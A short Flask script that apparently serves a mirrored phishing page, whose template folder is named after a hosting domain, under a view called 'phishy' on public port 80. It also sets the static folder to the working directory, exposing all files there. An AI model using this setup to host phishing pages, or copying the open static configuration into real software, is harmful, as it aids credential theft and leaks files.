from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='u1965047.plsk.regruhosting.ru/598')

@app.route('/598')
def phishy():
    return render_template('index.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)